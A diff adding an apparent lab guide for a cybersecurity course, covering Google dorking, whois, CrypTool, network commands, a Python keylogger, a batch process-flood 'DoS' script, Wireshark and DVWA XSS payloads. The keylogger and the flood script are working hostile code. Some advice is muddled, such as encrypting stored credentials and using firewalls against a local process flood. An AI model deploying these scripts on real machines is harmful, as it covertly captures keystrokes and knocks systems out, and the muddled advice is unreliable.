@@ -1,0 +1,174 @@
+**Cybersecurity Practical Guide**
+
+# 1. Reconnaissance using Google and Whois  
+## **Google Dorking Techniques**  
+Google Dorking is a hacking technique used to find sensitive information using advanced search operators. It helps attackers locate exposed databases, login pages, and sensitive documents.
+
+### **Common Google Dorking Queries:**  
+- `site:example.com filetype:pdf` - Find all PDF files on a domain.
+- `intitle:"index of"` - Locate directory listings exposed online.
+- `inurl:admin` - Discover admin panels.
+- `filetype:log` - Search for log files.
+- `inurl:wp-content` - Search for WordPress content.
+- `allinurl:auth` - Look for authentication pages.
+
+### **Advanced Google Dorking Examples**  
+- `site:gov filetype:xls` - Search for Excel files on government websites.
+- `"confidential" filetype:doc site:example.com` - Search for confidential Word documents on a specific site.
+- `inurl:/phpinfo.php` - Locate exposed PHP configuration pages.
+
+## **Whois for Domain Intelligence Gathering**  
+Whois provides domain ownership and registration details, revealing valuable information about a website's infrastructure.
+
+### **Steps to Use Whois:**  
+1. Open the terminal.
+2. Run: `whois example.com`
+3. Analyze details like registrar, IP address, and contact information.
+4. Use `dig example.com` to get DNS details.
+5. Run `nslookup example.com` for name server info.
+6. Use `whois -h whois.cymru.com " -v example.com"` for an extended lookup.
+
+### **Practical Use Cases:**  
+- Identifying the owner of a domain for cybersecurity investigations.
+- Finding potential subdomains and IP addresses linked to a target.
+- Gathering information on domain expiration to hijack abandoned domains.
+
+---
+
+# 2. Encrypt and Decrypt Passwords using CrypTool  
+## **Installation and Usage**  
+1. Download CrypTool from https://www.cryptool.org  
+2. Install and launch the application.  
+3. Navigate to `File -> New` and enter a sample password.  
+4. Select `Encrypt/Decrypt` and choose an algorithm (AES, RSA, DES, etc.).  
+
+### **Steps for Encryption & Decryption in CrypTool**  
+1. Open CrypTool and go to `File -> New`.
+2. Enter a sample password or text to encrypt.
+3. Click on `Encrypt/Decrypt` and choose `AES Encryption`.
+4. Provide a secret key and encrypt the text.
+5. Copy the encrypted output and save it.
+6. To decrypt, select `AES Decryption`, paste the encrypted text, and enter the key.
+7. Verify that the decrypted output matches the original text.
+
+### **Practical Use Cases:**  
+- Encrypting sensitive user credentials before storing them in databases.
+- Protecting communication between applications using encryption.
+- Demonstrating cryptographic concepts in cybersecurity courses.
+
+---
+
+# 3. Windows Command Analysis  
+## **Common Network Commands and Real-World Usage**  
+1. **ifconfig/ipconfig** – View network configurations.  
+   - Windows: `ipconfig /all`
+   - Linux: `ifconfig -a`
+   - Use case: Identify network interfaces and IP addresses.
+2. **ping** – Test network connectivity.
+   - Command: `ping google.com`
+   - Use case: Check if a website is reachable.
+3. **netstat** – Show active network connections.
+   - Command: `netstat -an`
+   - Use case: Identify suspicious connections.
+4. **traceroute/tracert** – Trace network path.
+   - Windows: `tracert google.com`
+   - Linux: `traceroute google.com`
+   - Use case: Identify network latency and hops.
+
+### **Expected Outputs and Analysis**  
+- `ipconfig /all`: Displays detailed network adapter information.
+- `netstat -an`: Reveals open ports and active network sessions.
+- `tracert google.com`: Shows the path taken by packets to reach Google.
+
+### **Practical Use Cases:**  
+- Diagnosing network issues in corporate environments.
+- Detecting unauthorized connections on a system.
+- Understanding routing paths for cybersecurity analysis.
+
+---
+
+# 4. Develop a Keylogger in Python  
+## **Python Keylogger Code:**  
+```python
+from pynput.keyboard import Listener
+
+def log_keystroke(key):
+    key = str(key).replace("'", "")
+    with open("keylog.txt", "a") as f:
+        f.write(key + "\n")
+
+with Listener(on_press=log_keystroke) as listener:
+    listener.join()
+```
+
+### **Saving and Running the Script**  
+1. Save the script as `keylogger.py`.
+2. Install dependencies: `pip install pynput`.
+3. Run the script: `python keylogger.py`.
+4. The logged keystrokes will be saved in `keylog.txt`.
+
+---
+
+# 5. Execute a Denial-of-Service (DoS) Attack using a Batch File  
+## **Understanding DoS Attacks**  
+Denial-of-Service (DoS) attacks overwhelm a system or network by flooding it with excessive requests, making it unavailable for legitimate users. These attacks can target servers, websites, or even individual computers, leading to significant disruptions.
+
+## **Batch Script for DoS Attack**  
+```batch
+@echo off
+:loop
+start notepad
+start calc
+start cmd
+goto loop
+```
+
+### **Execution Steps**  
+1. Save the script as `dos_attack.bat`.
+2. Double-click to run the script.
+3. Observe system slowdown due to excessive process creation.
+
+### **Impact of DoS Attacks:**  
+- Slows down or crashes the target system.
+- Causes financial loss due to downtime.
+- Disrupts services, affecting business operations.
+
+### **Preventive Measures:**  
+- Use firewalls to block unnecessary traffic.
+- Enable rate limiting on servers.
+- Monitor unusual network activity.
+- Implement strong authentication to prevent botnet infections.
+
+---
+
+# 6. Capture and Analyze Network Traffic using Wireshark  
+### **Steps to Install and Use Wireshark:**  
+1. Download and install Wireshark from https://www.wireshark.org.
+2. Open Wireshark and select a network interface.
+3. Click "Start" to begin packet capture.
+4. Use filters like `http` or `tcp.port == 80` to analyze traffic.
+5. Identify IP addresses and protocols used in communication.
+
+### **Real-World Usage:**  
+- Identify unauthorized data transmission.
+- Monitor network vulnerabilities.
+- Analyze malware-infected traffic.
+
+---
+
+# 7. Cross-Site Scripting (XSS) Attacks using DVWA  
+## **Executing XSS Attacks**  
+### **Reflected XSS Attack:**  
+1. Open DVWA, navigate to XSS (Reflected).
+2. Enter `<script>alert('Hacked!')</script>`.
+3. Observe the pop-up, indicating vulnerability.
+
+### **Stored XSS Attack:**  
+1. Go to "XSS (Stored)" section.
+2. Submit `<script>alert('Stored XSS')</script>` as a comment.
+3. Refresh and observe auto-execution.
+
+### **Mitigation Techniques:**  
+- Input validation and sanitization.
+- Use Content Security Policy (CSP).
+
